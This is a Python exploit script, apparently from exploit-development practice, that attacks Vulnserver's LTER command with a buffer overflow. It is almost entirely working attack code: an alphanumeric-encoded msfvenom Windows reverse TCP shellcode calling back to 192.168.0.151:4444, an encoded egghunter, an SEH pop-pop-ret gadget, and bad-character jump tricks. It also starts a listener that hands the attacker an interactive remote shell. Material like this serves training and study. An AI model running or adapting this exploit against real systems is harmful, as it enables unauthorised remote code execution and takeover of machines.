#!/usr/bin/env python3
#
# Vulnserver: LTER
# * pwntools
# * metasploit reverse_tcp payload
# * Ropper

# Warning: server crashes after shell exits. This is due to multiple stack pivots.

import sys
import pwn
from threading import Thread


# set target info
RHOST = '127.0.0.1'
RPORT = 9999
LPORT = 4444


def generate_payload():
    NOP = pwn.asm("inc ebx")  # cannot use NOP due to \x90 being bad char
    payload = ""

    # msfvenom -f python -v shellcode -p windows/shell_reverse_tcp LHOST=192.168.0.151 LPORT=4444 EXITFUNC=seh -e x86/alpha_upper BufferRegister=EAX # noqa: E501
    shellcode = ""
    shellcode += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    shellcode += "\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50"
    shellcode += "\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41"
    shellcode += "\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    shellcode += "\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b"
    shellcode += "\x4c\x4b\x58\x4d\x52\x55\x50\x55\x50\x43\x30\x33"
    shellcode += "\x50\x4b\x39\x5a\x45\x36\x51\x39\x50\x42\x44\x4c"
    shellcode += "\x4b\x56\x30\x36\x50\x4c\x4b\x30\x52\x44\x4c\x4c"
    shellcode += "\x4b\x36\x32\x44\x54\x4c\x4b\x42\x52\x46\x48\x44"
    shellcode += "\x4f\x48\x37\x30\x4a\x47\x56\x50\x31\x4b\x4f\x4e"
    shellcode += "\x4c\x47\x4c\x43\x51\x53\x4c\x34\x42\x36\x4c\x47"
    shellcode += "\x50\x49\x51\x58\x4f\x54\x4d\x35\x51\x59\x57\x4d"
    shellcode += "\x32\x5a\x52\x31\x42\x30\x57\x4c\x4b\x36\x32\x32"
    shellcode += "\x30\x4c\x4b\x50\x4a\x57\x4c\x4c\x4b\x50\x4c\x34"
    shellcode += "\x51\x44\x38\x5a\x43\x57\x38\x35\x51\x58\x51\x46"
    shellcode += "\x31\x4c\x4b\x30\x59\x37\x50\x33\x31\x39\x43\x4c"
    shellcode += "\x4b\x37\x39\x45\x48\x5a\x43\x36\x5a\x31\x59\x4c"
    shellcode += "\x4b\x30\x34\x4c\x4b\x53\x31\x48\x56\x36\x51\x4b"
    shellcode += "\x4f\x4e\x4c\x49\x51\x58\x4f\x54\x4d\x35\x51\x4f"
    shellcode += "\x37\x37\x48\x4d\x30\x32\x55\x4c\x36\x54\x43\x53"
    shellcode += "\x4d\x4b\x48\x47\x4b\x53\x4d\x57\x54\x42\x55\x4d"
    shellcode += "\x34\x56\x38\x4c\x4b\x31\x48\x51\x34\x53\x31\x39"
    shellcode += "\x43\x55\x36\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x51"
    shellcode += "\x48\x45\x4c\x45\x51\x48\x53\x4c\x4b\x35\x54\x4c"
    shellcode += "\x4b\x55\x51\x38\x50\x4b\x39\x30\x44\x37\x54\x51"
    shellcode += "\x34\x31\x4b\x31\x4b\x33\x51\x51\x49\x31\x4a\x36"
    shellcode += "\x31\x4b\x4f\x4b\x50\x31\x4f\x51\x4f\x30\x5a\x4c"
    shellcode += "\x4b\x52\x32\x4a\x4b\x4c\x4d\x51\x4d\x43\x58\x56"
    shellcode += "\x53\x37\x42\x53\x30\x35\x50\x45\x38\x52\x57\x43"
    shellcode += "\x43\x37\x42\x31\x4f\x36\x34\x42\x48\x30\x4c\x43"
    shellcode += "\x47\x36\x46\x53\x37\x4b\x4f\x38\x55\x38\x38\x5a"
    shellcode += "\x30\x53\x31\x55\x50\x45\x50\x36\x49\x59\x54\x50"
    shellcode += "\x54\x56\x30\x52\x48\x57\x59\x4b\x30\x52\x4b\x35"
    shellcode += "\x50\x4b\x4f\x48\x55\x50\x50\x50\x50\x56\x30\x36"
    shellcode += "\x30\x51\x50\x50\x50\x37\x30\x30\x50\x42\x48\x4b"
    shellcode += "\x5a\x44\x4f\x59\x4f\x4d\x30\x4b\x4f\x58\x55\x4a"
    shellcode += "\x37\x43\x5a\x34\x45\x45\x38\x4f\x30\x39\x38\x55"
    shellcode += "\x50\x4a\x37\x45\x38\x35\x52\x43\x30\x34\x51\x51"
    shellcode += "\x4c\x4c\x49\x4a\x46\x53\x5a\x34\x50\x36\x36\x31"
    shellcode += "\x47\x55\x38\x4a\x39\x4e\x45\x34\x34\x33\x51\x4b"
    shellcode += "\x4f\x4e\x35\x4b\x35\x4f\x30\x54\x34\x54\x4c\x4b"
    shellcode += "\x4f\x30\x4e\x55\x58\x52\x55\x5a\x4c\x55\x38\x4a"
    shellcode += "\x50\x48\x35\x4f\x52\x30\x56\x4b\x4f\x48\x55\x32"
    shellcode += "\x48\x53\x53\x42\x4d\x55\x34\x35\x50\x4d\x59\x4a"
    shellcode += "\x43\x56\x37\x31\x47\x36\x37\x56\x51\x4c\x36\x32"
    shellcode += "\x4a\x42\x32\x31\x49\x31\x46\x4a\x42\x4b\x4d\x55"
    shellcode += "\x36\x59\x57\x30\x44\x31\x34\x57\x4c\x55\x51\x35"
    shellcode += "\x51\x4c\x4d\x50\x44\x47\x54\x42\x30\x39\x56\x55"
    shellcode += "\x50\x51\x54\x56\x34\x56\x30\x31\x46\x56\x36\x46"
    shellcode += "\x36\x31\x56\x46\x36\x30\x4e\x30\x56\x30\x56\x31"
    shellcode += "\x43\x36\x36\x33\x58\x42\x59\x58\x4c\x47\x4f\x4c"
    shellcode += "\x46\x4b\x4f\x58\x55\x4d\x59\x4d\x30\x30\x4e\x51"
    shellcode += "\x46\x47\x36\x4b\x4f\x46\x50\x52\x48\x54\x48\x4d"
    shellcode += "\x57\x55\x4d\x45\x30\x4b\x4f\x38\x55\x4f\x4b\x4b"
    shellcode += "\x4e\x34\x4e\x56\x52\x4b\x5a\x35\x38\x4e\x46\x4c"
    shellcode += "\x55\x4f\x4d\x4d\x4d\x4b\x4f\x49\x45\x57\x4c\x45"
    shellcode += "\x56\x53\x4c\x54\x4a\x4b\x30\x4b\x4b\x4d\x30\x33"
    shellcode += "\x45\x34\x45\x4f\x4b\x50\x47\x45\x43\x34\x32\x52"
    shellcode += "\x4f\x53\x5a\x35\x50\x51\x43\x4b\x4f\x58\x55\x41"
    shellcode += "\x41"

    # shellcode to be found by egghunter, we need the version that
    # is not "translated", hence TAG will have bad bytes on purpose
    # thus, correct form will be located in the memory
    payload += "\xFF\xFE\xFD\xFC" * 2  # TAG
    payload += shellcode

    # custom egghunter, encoded with x86/alpha_mixed
    # fits exactly in the created buffer (max 0x7e bytes)
    # nasm -f bin egghunter.asm && cat egghunter | msfvenom -p - --platform windows -a x86 -e x86/alpha_mixed BufferRegister=EAX -v egghunter -f python # noqa: E501
    egghunter = ""
    egghunter += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    egghunter += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
    egghunter += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
    egghunter += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
    egghunter += "\x42\x75\x4a\x49\x73\x56\x4b\x31\x4b\x7a\x49\x6f"
    egghunter += "\x34\x4f\x61\x52\x66\x32\x71\x7a\x77\x72\x72\x78"
    egghunter += "\x6a\x6d\x64\x6e\x61\x4a\x67\x4c\x46\x65\x33\x44"
    egghunter += "\x48\x6f\x6e\x58\x79\x6f\x39\x6e\x39\x6d\x49\x6c"
    egghunter += "\x4d\x59\x38\x57\x4e\x4f\x44\x35\x49\x7a\x6e\x4f"
    egghunter += "\x33\x45\x6d\x37\x4f\x79\x4c\x38\x39\x6f\x4d\x30"
    egghunter += "\x41\x41"

    # the gadget address translates to "POP ESI; SBB [EAX+62], edx
    # prior 4 bytes are used to set EAX=ESP to mitigate SBB instruction
    # instead of jumping over the addr, we will go through it like real badass
    PPR_GADGET = pwn.p32(0x6250195e)  # pop edi; pop ebp; ret;

    # two instructions that will result in backward JMP (note bad char translation: 0xFF -> 0x80)
    # results in: JMP $-7E
    jump = ""
    jump += "\x71\xFF"  # JNO
    jump += "\x70\xFF"  # JO

    payload += NOP * (3518 - 0x76 - 0x76 + 8 - len(payload))
    payload += egghunter

    payload += NOP * (3518 - 0x76 - len(payload))
    payload += jump

    payload += NOP * (3518 - len(payload))
    payload += pwn.asm("inc eax; inc eax; push esp; pop eax")  # set EAX=ESP
    payload += PPR_GADGET
    payload += pwn.asm("push esp; pop eax")
    payload += pwn.asm("add eax, 0x77772349")
    payload += pwn.asm("sub eax, 0x77771111")  # eax = esp + 0x1228
    payload += jump

    payload += NOP * (5000 - len(payload))

    return "LTER .{}\n".format(payload)


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    r.send(generate_payload())


if __name__ == "__main__":
    if len(sys.argv) > 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
